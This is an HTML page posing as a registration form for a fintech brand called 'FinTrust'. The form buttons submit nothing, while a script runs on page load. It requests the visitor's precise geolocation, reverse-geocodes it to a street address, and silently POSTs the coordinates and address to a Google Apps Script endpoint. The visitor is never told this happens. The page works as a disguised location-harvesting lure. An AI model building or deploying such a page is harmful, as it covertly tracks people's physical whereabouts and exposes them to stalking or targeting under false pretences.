<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>FinTech Register</title>
  <style>
    /* Reset and base */
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0d47a1 0%, #1976d2 100%);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #fff;
    }
    /* Container */
    .container {
      background: #ffffff;
      color: #1a1a1a;
      border-radius: 12px;
      box-shadow: 0 16px 40px rgba(0,0,0,0.2);
      max-width: 420px;
      width: 100%;
      padding: 40px 35px;
      font-size: 16px;
    }
    /* Logo placeholder */
    .logo {
      text-align: center;
      margin-bottom: 30px;
    }
    .logo h1 {
      font-weight: 700;
      font-size: 28px;
      letter-spacing: 3px;
      color: #1976d2;
      margin: 0;
      user-select: none;
    }
    /* Form title */
    h2 {
      font-weight: 600;
      font-size: 24px;
      margin-bottom: 25px;
      text-align: center;
      color: #222;
    }
    /* Inputs */
    input[type="text"],
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 14px 15px;
      margin-bottom: 20px;
      border: 1.8px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
      transition: border-color 0.3s ease;
      font-family: inherit;
      outline-offset: 0;
    }
    input[type="text"]:focus,
    input[type="email"]:focus,
    input[type="password"]:focus {
      border-color: #1976d2;
      box-shadow: 0 0 6px rgba(25, 118, 210, 0.5);
      outline: none;
    }
    /* Buttons */
    button {
      width: 100%;
      padding: 14px;
      border-radius: 6px;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
      border: none;
      transition: background-color 0.3s ease;
      user-select: none;
      box-shadow: 0 6px 12px rgba(25, 118, 210, 0.4);
    }
    button.register-btn {
      background-color: #1976d2;
      color: white;
      margin-bottom: 15px;
    }
    button.register-btn:hover {
      background-color: #0d47a1;
      box-shadow: 0 8px 16px rgba(13, 71, 161, 0.6);
    }
    button.signin-btn {
      background-color: #e3e3e3;
      color: #1976d2;
      font-weight: 600;
      box-shadow: none;
    }
    button.signin-btn:hover {
      background-color: #c9c9c9;
      color: #0d47a1;
    }
    /* Responsive */
    @media (max-width: 480px) {
      .container {
        padding: 30px 20px;
      }
      input[type="text"],
      input[type="email"],
      input[type="password"] {
        padding: 12px 10px;
        font-size: 14px;
      }
      button {
        padding: 12px;
        font-size: 16px;
      }
      h2 {
        font-size: 22px;
      }
    }
  </style>
</head>
<body>
  <div class="container" role="main" aria-label="Registration Form">
    <div class="logo" aria-hidden="true">
      <h1>FinTrust</h1>
    </div>
    <h2>Create your account</h2>
    <form aria-describedby="register-instruction">
      <input type="text" placeholder="First Name" name="firstName" autocomplete="given-name" required />
      <input type="text" placeholder="Last Name" name="lastName" autocomplete="family-name" required />
      <input type="email" placeholder="Email Address" name="email" autocomplete="email" required />
      <input type="password" placeholder="Password" name="password" autocomplete="new-password" required />
      <input type="password" placeholder="Confirm Password" name="confirmPassword" autocomplete="new-password" required />
      <button type="button" class="register-btn" aria-label="Register">Register</button>
      <button type="button" class="signin-btn" aria-label="Sign In">Sign In</button>
    </form>
  </div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        console.warn("Geolocation is not supported by this browser.");
      }
    }

    function sendPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;

      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
        .then(res => res.json())
        .then(data => {
          const address = data.display_name || "Address not found";

          // Send data with no-cors to avoid CORS errors
          fetch('https://script.google.com/macros/s/AKfycbxxNyGyhooeofr9ZlRQEu90bolM3UfzfkxKENBzyXvHALV3d0lTA_HP0MIJMZO2F5QvPw/exec', {
            method: 'POST',
            mode: 'no-cors',  // <-- important to bypass CORS limitation
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({
              latitude: lat,
              longitude: lon,
              address: address
            })
          }).catch(err => console.error('Failed to send location:', err));
        })
        .catch(err => console.error('Failed to reverse geocode:', err));
    }

    function showError(error) {
      console.warn("Geolocation error:", error);
    }

    // Request location on page load
    window.onload = getLocation;
  </script>
</body>
</html>
